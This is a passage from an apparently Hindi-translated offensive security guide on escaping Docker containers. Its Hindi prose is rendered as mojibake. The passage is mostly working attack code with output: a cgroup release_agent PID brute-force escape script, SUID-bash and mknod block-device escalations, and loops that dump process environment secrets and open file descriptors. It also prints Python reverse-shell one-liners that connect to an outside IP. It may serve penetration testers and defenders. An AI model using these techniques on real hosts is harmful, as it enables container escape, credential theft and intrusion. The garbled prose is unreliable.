# Brute force the host pid until the output path is created, or we run out of guesses
TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID} :-("
exit 1
fi
fi
# Set the release_agent path to the guessed pid
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
# Trigger execution of the release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

# Wait for and cat the output
sleep 1
echo "Done! Output:"
cat ${OUTPUT_PATH}
```
рдПрдХ рдкреНрд░рд┐рд╡рд┐рд▓реЗрдЬреНрдб рдХрдВрдЯреЗрдирд░ рдХреЗ рднреАрддрд░ PoC рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рд╕реЗ рдЖрдЙрдЯрдкреБрдЯ рдРрд╕рд╛ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП:
```bash
root@container:~$ ./release_agent_pid_brute.sh
Checking pid 100
Checking pid 200
Checking pid 300
Checking pid 400
Checking pid 500
Checking pid 600
Checking pid 700
Checking pid 800
Checking pid 900
Checking pid 1000
Checking pid 1100
Checking pid 1200

Done! Output:
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0 11:25 ?        00:00:01 /sbin/init
root         2     0  0 11:25 ?        00:00:00 [kthreadd]
root         3     2  0 11:25 ?        00:00:00 [rcu_gp]
root         4     2  0 11:25 ?        00:00:00 [rcu_par_gp]
root         5     2  0 11:25 ?        00:00:00 [kworker/0:0-events]
root         6     2  0 11:25 ?        00:00:00 [kworker/0:0H-kblockd]
root         9     2  0 11:25 ?        00:00:00 [mm_percpu_wq]
root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
...
```
#### рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░рд┐рдХ рднреВрдорд┐рдХрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдорд╛рдЙрдВрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ

рдХрдИ рдлрд╝рд╛рдЗрд▓реЗрдВ рд╣реЛ рд╕рдХрддреА рд╣реИрдВ рдЬреЛ рдорд╛рдЙрдВрдЯ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИрдВ рдЬреЛ **рдЕрдВрддрд░реНрдирд┐рд╣рд┐рдд рд╣реЛрд╕реНрдЯ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЬрд╛рдирдХрд╛рд░реА рджреЗрддреА рд╣реИрдВ**ред рдЗрдирдореЗрдВ рд╕реЗ рдХреБрдЫ рдРрд╕реА рднреА рд╣реЛ рд╕рдХрддреА рд╣реИрдВ рдЬреЛ **рд╣реЛрд╕реНрдЯ рджреНрд╡рд╛рд░рд╛ рдХреБрдЫ рд╣реЛрдиреЗ рдкрд░ рдХреБрдЫ рдХрд╛рд░реНрдп рдХрд░рдиреЗ рдХреА рд╕рдВрдХреЗрдд рджреЗрддреА рд╣реИрдВ** (рдЬрд┐рд╕рд╕реЗ рд╣рдорд▓рд╛рд╡рд░ рдирд┐рдХрд▓ рд╕рдХрддрд╛ рд╣реИ)ред\
рдЗрди рдлрд╝рд╛рдЗрд▓реЛрдВ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдпрд╣ рд╕рдВрднрд╡ рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИ рдХрд┐:

* release\_agent (рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рд╢рд╛рдорд┐рд▓ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ)
* [binfmt\_misc](sensitive-mounts.md#proc-sys-fs-binfmt\_misc)
* [core\_pattern](sensitive-mounts.md#proc-sys-kernel-core\_pattern)
* [uevent\_helper](sensitive-mounts.md#sys-kernel-uevent\_helper)
* [modprobe](sensitive-mounts.md#proc-sys-kernel-modprobe)

рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЖрдк рдЗрд╕ рдкреГрд╖реНрда рдореЗрдВ рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **рдЕрдиреНрдп рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдлрд╝рд╛рдЗрд▓реЗрдВ** рднреА рдЦреЛрдЬ рд╕рдХрддреЗ рд╣реИрдВ:

{% content-ref url="sensitive-mounts.md" %}
[sensitive-mounts.md](sensitive-mounts.md)
{% endcontent-ref %}

### рдЕрдирд┐рдпрдорд┐рдд рдорд╛рдЙрдВрдЯ

рдХрдИ рдЕрд╡рд╕рд░реЛрдВ рдореЗрдВ рдЖрдкрдХреЛ рдкрд╛рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдХрд┐ **рдХрдВрдЯреЗрдирд░ рдореЗрдВ рд╣реЛрд╕реНрдЯ рд╕реЗ рдХреБрдЫ рд╡реЙрд▓реНрдпреВрдо рдорд╛рдЙрдВрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ**ред рдпрджрд┐ рдпрд╣ рд╡реЙрд▓реНрдпреВрдо рд╕рд╣реА рдврдВрдЧ рд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рддреЛ рдЖрдк **рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдбреЗрдЯрд╛ рддрдХ рдкрд╣реБрдВрдЪ/рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**: рдЧреБрдкреНрдд рд╕реАрдХреНрд░реЗрдЯ рдкрдврд╝реЗрдВ, рдПрд╕рдПрд╕рдПрдЪ рдЕрдзрд┐рдХреГрдд\_рдХреБрдВрдЬреА рдмрджрд▓реЗрдВ...
```bash
docker run --rm -it -v /:/host ubuntu bash
```
### 2 рд╢реЗрд▓реНрд╕ рдФрд░ рд╣реЛрд╕реНрдЯ рдорд╛рдЙрдВрдЯ рдХреЗ рд╕рд╛рде рдкреНрд░рд┐рд╡рд┐рд▓реЗрдЬ рдПрд╕реНрдХрд▓реЗрд╢рди

рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдХрд┐рд╕реА рдХрдВрдЯреЗрдирд░ рдХреЗ рдЕрдВрджрд░ **рд░реВрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рдПрдХреНрд╕реЗрд╕** рд╣реИ рдЬрд┐рд╕рдореЗрдВ рд╣реЛрд╕реНрдЯ рд╕реЗ рдХреБрдЫ рдлрд╝реЛрд▓реНрдбрд░ рдорд╛рдЙрдВрдЯ рд╣реИ рдФрд░ рдЖрдк **рдЧреИрд░-рдкреНрд░рд┐рд╡рд┐рд▓реЗрдЬреНрдб рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рд╣реЛрд╕реНрдЯ рдкрд░ рдмрд╛рд╣рд░ рдирд┐рдХрд▓ рдЧрдП** рд╣реИрдВ рдФрд░ рдорд╛рдЙрдВрдЯреЗрдб рдлрд╝реЛрд▓реНрдбрд░ рдкрд░ рдкрдврд╝рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реИред\
рдЖрдк **рдХрдВрдЯреЗрдирд░ рдХреЗ рдЕрдВрджрд░ рдорд╛рдЙрдВрдЯреЗрдб рдлрд╝реЛрд▓реНрдбрд░** рдореЗрдВ рдПрдХ **рдмреИрд╢ рд╕реБрдЗрдб рдлрд╝рд╛рдЗрд▓** рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЗрд╕реЗ **рд╣реЛрд╕реНрдЯ рд╕реЗ рдПрдХреНрд╕реЗрдХреНрдпреВрдЯ** рдХрд░рдХреЗ рдкреНрд░рд┐рд╡рд┐рд▓реЗрдЬ рдПрд╕реНрдХреЗрд▓реЗрд╢рди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```bash
cp /bin/bash . #From non priv inside mounted folder
# You need to copy it from the host as the bash binaries might be diferent in the host and in the container
chown root:root bash #From container as root inside mounted folder
chmod 4777 bash #From container as root inside mounted folder
bash -p #From non priv inside mounted folder
```
### 2 рд╢реЗрд▓реНрд╕ рдХреЗ рд╕рд╛рде рдкреНрд░рд┐рд╡рд┐рд▓реЗрдЬ рдПрд╕реНрдХрд▓реЗрд╢рди

рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ **рдХрдВрдЯреЗрдирд░ рдХреЗ рднреАрддрд░ рд░реВрдЯ рдПрдХреНрд╕реЗрд╕** рд╣реИ рдФрд░ рдЖрдкрдиреЗ **рдЧреИрд░ рдкреНрд░рд┐рд╡рд┐рд▓реЗрдЬреНрдб рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рд╣реЛрд╕реНрдЯ рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓ рд▓рд┐рдпрд╛ рд╣реИ**, рддреЛ рдЖрдк рджреЛрдиреЛрдВ рд╢реЗрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **рд╣реЛрд╕реНрдЯ рдХреЗ рдЕрдВрджрд░ рдкреНрд░рд┐рд╡рд┐рд▓реЗрдЬ рдПрд╕реНрдХрд▓реЗрд╢рди** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдХрдВрдЯреЗрдирд░ рдХреЗ рднреАрддрд░ рдХреНрд╖рдорддрд╛ MKNOD рд╣реИ (рдпрд╣ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рд╣реИ) рдЬреИрд╕рд╛ рдХрд┐ [**рдЗрд╕ рдкреЛрд╕реНрдЯ рдореЗрдВ рд╡рд┐рд╡рд░рдгрд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ**](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/)ред\
рдЗрд╕ рддрд░рд╣ рдХреА рдХреНрд╖рдорддрд╛ рдХреЗ рд╕рд╛рде, рдХрдВрдЯреЗрдирд░ рдХреЗ рднреАрддрд░ рд░реВрдЯ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ **рдмреНрд▓реЙрдХ рдбрд┐рд╡рд╛рдЗрд╕ рдлрд╝рд╛рдЗрд▓реЗрдВ рдмрдирд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реЛрддреА рд╣реИ**ред рдбрд┐рд╡рд╛рдЗрд╕ рдлрд╝рд╛рдЗрд▓реЗрдВ рд╡рд┐рд╢реЗрд╖ рдлрд╝рд╛рдЗрд▓реЗрдВ рд╣реИрдВ рдЬреЛ **рдЖрдзрд╛рд░рднреВрдд рд╣рд╛рд░реНрдбрд╡реЗрдпрд░ рдФрд░ рдХрд░реНрдирд▓ рдореЙрдбреНрдпреВрд▓ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ** рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛рддреА рд╣реИрдВред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, /dev/sda рдмреНрд▓реЙрдХ рдбрд┐рд╡рд╛рдЗрд╕ рдлрд╝рд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рдбрд┐рд╕реНрдХ рдкрд░ **рд░реЙ рдбреЗрдЯрд╛ рдкрдврд╝рдиреЗ рдХреА рдкрд╣реБрдВрдЪ** рджреЗрддреА рд╣реИред

рдбреЙрдХрд░ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдмреНрд▓реЙрдХ рдбрд┐рд╡рд╛рдЗрд╕ **рдХрдВрдЯреЗрдирд░ рдХреЗ рднреАрддрд░ рд╕реЗ рджреБрд░реБрдкрдпреЛрдЧ рдирд╣реАрдВ рд╣реЛ рд╕рдХрддреЗ** рд╣реИрдВ, рдХреНрдпреЛрдВрдХрд┐ рдЗрд╕рдХреЗ рд▓рд┐рдП рдХрдВрдЯреЗрдирд░ рдкрд░ cgroup рдиреАрддрд┐ рд╕реЗрдЯ рдХреА рдЬрд╛рддреА рд╣реИ рдЬреЛ рдмреНрд▓реЙрдХ рдбрд┐рд╡рд╛рдЗрд╕ рдХреЗ рдкрдврд╝рдиреЗ рдФрд░ рд▓рд┐рдЦрдиреЗ рдХреЛ рдмреНрд▓реЙрдХ рдХрд░рддреА рд╣реИред\
рд╣рд╛рд▓рд╛рдВрдХрд┐, рдпрджрд┐ рдХрдВрдЯреЗрдирд░ рдХреЗ рднреАрддрд░ рдПрдХ рдмреНрд▓реЙрдХ рдбрд┐рд╡рд╛рдЗрд╕ **рдХрдВрдЯреЗрдирд░ рдХреЗ рдмрд╛рд╣рд░ рдХрд┐рд╕реА рд╡реНрдпрдХреНрддрд┐ рджреНрд╡рд╛рд░рд╛ рдмрдирд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ**, рддреЛ рдЙрд╕реЗ /proc/PID/root/ рдлрд╝реЛрд▓реНрдбрд░ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдПрдХ рд╡реНрдпрдХреНрддрд┐ **рдХрдВрдЯреЗрдирд░ рдХреЗ рдмрд╛рд╣рд░** рджреНрд╡рд╛рд░рд╛ рдПрдХреНрд╕реЗрд╕ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рд╕реАрдорд╛ рдпрд╣ рд╣реИ рдХрд┐ **рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдмрд╛рд╣рд░ рдФрд░ рдХрдВрдЯреЗрдирд░ рдХреЗ рднреАрддрд░ рдПрдХ рд╣реА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рджреНрд╡рд╛рд░рд╛ рд╕реНрд╡рд╛рдорд┐рддреНрд╡ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП**ред

**рд╢реЛрд╖рдг** рдХрд╛ рдЙрджрд╛рд╣рд░рдг рдЗрд╕ [**рд▓реЗрдЦ рдореЗрдВ**](https://radboudinstituteof.pwning.nl/posts/htbunictfquals2021/goodgames/) рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ:
```bash
# On the container as root
cd /
# Crate device
mknod sda b 8 0
# Give access to it
chmod 777 sda

# Create the nonepriv user of the host inside the container
## In this case it's called augustus (like the user from the host)
echo "augustus:x:1000:1000:augustus,,,:/home/augustus:/bin/bash" >> /etc/passwd
# Get a shell as augustus inside the container
su augustus
su: Authentication failure
(Ignored)
augustus@3a453ab39d3d:/backend$ /bin/sh
/bin/sh
$
```

```bash
# On the host

# get the real PID of the shell inside the container as the new https://app.gitbook.com/s/-L_2uGJGU7AVNRcqRvEi/~/changes/3847/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation#privilege-escalation-with-2-shells user
augustus@GoodGames:~$ ps -auxf | grep /bin/sh
root      1496  0.0  0.0   4292   744 ?        S    09:30   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
root      1627  0.0  0.0   4292   756 ?        S    09:44   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
augustus  1659  0.0  0.0   4292   712 ?        S+   09:48   0:00                          \_ /bin/sh
augustus  1661  0.0  0.0   6116   648 pts/0    S+   09:48   0:00              \_ grep /bin/sh

# The process ID is 1659 in this case
# Grep for the sda for HTB{ through the process:
augustus@GoodGames:~$ grep -a 'HTB{' /proc/1659/root/sda
HTB{7h4T_w45_Tr1cKy_1_D4r3_54y}
```
### hostPID

рдпрджрд┐ рдЖрдк рд╣реЛрд╕реНрдЯ рдХреЗ рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдЖрдк рдЙрди рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдореЗрдВ рд╕рдВрдЧреНрд░рд╣рд┐рдд рдмрд╣реБрдд рд╕рд╛рд░реА рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХреЗрдВрдЧреЗред рдЯреЗрд╕реНрдЯ рд▓реИрдм рдЪрд▓рд╛рдПрдБ:
```
docker run --rm -it --pid=host ubuntu bash
```
рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдЖрдк `ps auxn` рдХреА рддрд░рд╣ рдХреБрдЫ рдЪреАрдЬреЛрдВ рдХреА рд╕реВрдЪреА рдмрдирд╛ рд╕рдХреЗрдВрдЧреЗ рдФрд░ рдХрдорд╛рдВрдб рдореЗрдВ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╡рд┐рд╡рд░рдгреЛрдВ рдХреА рдЦреЛрдЬ рдХрд░ рд╕рдХреЗрдВрдЧреЗред

рдлрд┐рд░, рдЬреИрд╕рд╛ рдХрд┐ рдЖрдк **/proc/ рдореЗрдВ рд╣реЛрд╕реНрдЯ рдХреЗ рдкреНрд░рддреНрдпреЗрдХ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ, рдЖрдк рдЙрдирдХреЗ env рд╕реАрдХреНрд░реЗрдЯреНрд╕ рдЪреЛрд░реА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рдЬреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЛ рдЪрд▓рд╛ рдХрд░:
```bash
for e in `ls /proc/*/environ`; do echo; echo $e; xargs -0 -L1 -a $e; done
/proc/988058/environ
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
HOSTNAME=argocd-server-69678b4f65-6mmql
USER=abrgocd
...
```
рдЖрдк рдЕрдиреНрдп рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЗ рдлрд╝рд╛рдЗрд▓ рдбрд┐рд╕реНрдХреНрд░рд┐рдкреНрдЯрд░реНрд╕ рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЙрдирдХреА рдЦреБрд▓реА рдлрд╝рд╛рдЗрд▓реЗрдВ рдкрдврд╝ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
for fd in `find /proc/*/fd`; do ls -al $fd/* 2>/dev/null | grep \>; done > fds.txt
less fds.txt
...omitted for brevity...
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/2 -> /dev/pts/0
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/4 -> /.secret.txt.swp
# You can open the secret filw with:
cat /proc/635813/fd/4
```
рдЖрдк рднреА **рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЛ рдорд╛рд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдПрдХ рдбреАрдУрдПрд╕ рдХрд╛ рдХрд╛рд░рдг рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ**ред

{% hint style="warning" %}
рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдХрд┐рд╕реА рддрд░рд╣ рд╕реЗ рдПрдХ рдХрдВрдЯреЗрдирд░ рдХреЗ рдмрд╛рд╣рд░ рдХреА рдкреНрд░рд┐рд╡рд┐рд▓реЗрдЬреНрдб **рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдкрд░ рдкрд╣реБрдВрдЪ рд╣реИ**, рддреЛ рдЖрдк рдХреБрдЫ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВ `nsenter --target <pid> --all` рдпрд╛ `nsenter --target <pid> --mount --net --pid --cgroup` рдЬрд┐рд╕рд╕реЗ рдЖрдкрдХреЛ рдЙрдореНрдореАрдж рд╣реИ рдХрд┐ рдЙрд╕ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рд╕рд╛рде рдПрдХ рд╣реА рдПрдирдПрд╕ рдкреНрд░рддрд┐рдмрдВрдзреЛрдВ (рдЖрд╢рд╛ рд╣реИ рдХрд┐ рдХреЛрдИ рдирд╣реАрдВ) рд╡рд╛рд▓рд╛ рд╢реЗрд▓ рдЪрд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдорд┐рд▓реЗрдЧрд╛ред
{% endhint %}

### hostNetwork
```
docker run --rm -it --network=host ubuntu bash
```
рдпрджрд┐ рдПрдХ рдХрдВрдЯреЗрдирд░ Docker [рд╣реЛрд╕реНрдЯ рдиреЗрдЯрд╡рд░реНрдХрд┐рдВрдЧ рдбреНрд░рд╛рдЗрд╡рд░ (`--network=host`)](https://docs.docker.com/network/host/) рдХреЗ рд╕рд╛рде рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реЛрддрд╛ рд╣реИ, рддреЛ рдЙрд╕ рдХрдВрдЯреЗрдирд░ рдХрд╛ рдиреЗрдЯрд╡рд░реНрдХ рд╕реНрдЯреИрдХ Docker рд╣реЛрд╕реНрдЯ рд╕реЗ рдЕрд▓рдЧ рдирд╣реАрдВ рд╣реЛрддрд╛ рд╣реИ (рдХрдВрдЯреЗрдирд░ рд╣реЛрд╕реНрдЯ рдХреЗ рдиреЗрдЯрд╡рд░реНрдХрд┐рдВрдЧ рдиреЗрдорд╕реНрдкреЗрд╕ рдХреЛ рд╕рд╛рдЭрд╛ рдХрд░рддрд╛ рд╣реИ), рдФрд░ рдХрдВрдЯреЗрдирд░ рдХреЛ рдЕрдкрдирд╛ рдЖрдИрдкреА-рдкрддрд╛ рдЖрд╡рдВрдЯрд┐рдд рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рджреВрд╕рд░реЗ рд╢рдмреНрджреЛрдВ рдореЗрдВ, **рдХрдВрдЯреЗрдирд░ рд╕рднреА рд╕реЗрд╡рд╛рдПрдВ рд╕реАрдзреЗ рд╣реЛрд╕реНрдЯ рдХреЗ рдЖрдИрдкреА рдкрд░ рдмрд╛рдЗрдВрдб рдХрд░рддрд╛ рд╣реИ**ред рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдХрдВрдЯреЗрдирд░ **рд╡реЗ рд╕рднреА рдиреЗрдЯрд╡рд░реНрдХ рдЯреНрд░реИрдлрд╝рд┐рдХ рдХреЛ рднреА рдЕрдВрддрд░реНрдЧрдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ рд╣реЛрд╕реНрдЯ** рд╕рд╛рдЭрд╛ рдЗрдВрдЯрд░рдлрд╝реЗрд╕ `tcpdump -i eth0` рдкрд░ рднреЗрдЬ рд░рд╣рд╛ рд╣реИ рдФрд░ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд░рд╣рд╛ рд╣реИред

рдЙрджрд╛рд╣рд░рдг рдХреЗ рд░реВрдк рдореЗрдВ, рдЖрдк рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **рд╣реЛрд╕реНрдЯ рдФрд░ рдореЗрдЯрд╛рдбреЗрдЯрд╛ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдХреЗ рдмреАрдЪ рдЯреНрд░реИрдлрд╝рд┐рдХ рдХреЛ рд╕реНрдирд┐рдлрд╝ рдФрд░ рд╕реНрдкреВрдлрд╝ рдХрд░рдиреЗ** рдХреЗ рд▓рд┐рдП рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдЬреИрд╕реЗ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЙрджрд╛рд╣рд░рдгреЛрдВ рдореЗрдВ:

* [рд▓реЗрдЦ: Google SRE рд╕реЗ рд╕рдВрдкрд░реНрдХ рдХреИрд╕реЗ рдХрд░реЗрдВ: рдХреНрд▓рд╛рдЙрдб SQL рдореЗрдВ рд╢реИрд▓ рдбреНрд░реЙрдк рдХрд░рдирд╛](https://offensi.com/2020/08/18/how-to-contact-google-sre-dropping-a-shell-in-cloud-sql/)
* [рдореЗрдЯрд╛рдбреЗрдЯрд╛ рд╕реЗрд╡рд╛ MITM рд░реВрдЯ рдкреНрд░рд┐рд╡рд┐рд▓реЗрдЬ рдПрд╕реНрдХреЗрд▓реЗрд╢рди рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ (EKS / GKE)](https://blog.champtar.fr/Metadata\_MITM\_root\_EKS\_GKE/)

рдЖрдк рд╣реЛрд╕реНрдЯ рдХреЗ рдЕрдВрджрд░ рдмрд╛рдЗрдВрдб рдХрд┐рдП рдЧрдП **рд▓реЛрдХрд▓рд╣реЛрд╕реНрдЯ рдкрд░ рдиреЗрдЯрд╡рд░реНрдХ рд╕реЗрд╡рд╛рдУрдВ рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХреЗрдВрдЧреЗ** рдпрд╛ рдлрд┐рд░ рдиреЛрдб рдХреА **рдореЗрдЯрд╛рдбреЗрдЯрд╛ рдЕрдиреБрдорддрд┐рдпреЛрдВ рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХреЗрдВрдЧреЗ** (рдЬреЛ рдХрдВрдЯреЗрдирд░ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рд╣реЛ рд╕рдХрддреА рд╣реИ)ред

### hostIPC
```
docker run --rm -it --ipc=host ubuntu bash
```
рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдХреЗрд╡рд▓ `hostIPC=true` рд╣реИ, рддреЛ рдЖрдк рдмрд╣реБрдд рдХреБрдЫ рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдпрджрд┐ рд╣реЛрд╕реНрдЯ рдкрд░ рдХреЛрдИ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдпрд╛ рдХрд┐рд╕реА рдЕрдиреНрдп рдкреЙрдб рдХреЗ рднреАрддрд░ рдХреЛрдИ рдкреНрд░рдХреНрд░рд┐рдпрд╛рдПрдВ рд╣реЛрд╕реНрдЯ рдХреЗ **рдЗрдВрдЯрд░-рдкреНрд░реЛрд╕реЗрд╕ рд╕рдВрдЪрд╛рд░ рддрдВрддреНрд░** (рд╕рд╛рдЭрд╛ рдореЗрдореЛрд░реА, рд╕реЗрдорд╛рдлреЛрд░ рдЕрд░реНрд░реЗ, рд╕рдВрджреЗрд╢ рдХрддрд╛рд░реЗрдВ, рдЖрджрд┐) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣реА рд╣реИрдВ, рддреЛ рдЖрдк рдЙрдиреА рд╕рдВрдЪрд╛рд░ рддрдВрддреНрд░реЛрдВ рдореЗрдВ рдкрдврд╝рдиреЗ/рд▓рд┐рдЦрдиреЗ рдХрд░ рд╕рдХреЗрдВрдЧреЗред рдкрд╣рд▓реА рдЬрдЧрд╣ рдЬрд╣рд╛рдВ рдЖрдк рджреЗрдЦрдирд╛ рдЪрд╛рд╣реЗрдВрдЧреЗ, рд╡рд╣ рд╣реИ `/dev/shm`, рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ `hostIPC=true` рд╡рд╛рд▓реЗ рдХрд┐рд╕реА рднреА рдкреЙрдб рдФрд░ рд╣реЛрд╕реНрдЯ рдХреЗ рдмреАрдЪ рд╕рд╛рдЭрд╛ рд╣реЛрддрд╛ рд╣реИред рдЖрдкрдХреЛ `ipcs` рдХреЗ рд╕рд╛рде рдЕрдиреНрдп IPC рддрдВрддреНрд░реЛрдВ рдХреА рдЬрд╛рдВрдЪ рднреА рдХрд░рдиреА рдЪрд╛рд╣рд┐рдПред

* **/dev/shm рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ** - рдЗрд╕ рд╕рд╛рдЭреА рд╕реНрдореГрддрд┐ рд╕реНрдерд╛рди рдореЗрдВ рдХрд┐рд╕реА рднреА рдлрд╝рд╛рдЗрд▓ рдХреЗ рд▓рд┐рдП рджреЗрдЦреЗрдВ: `ls -la /dev/shm`
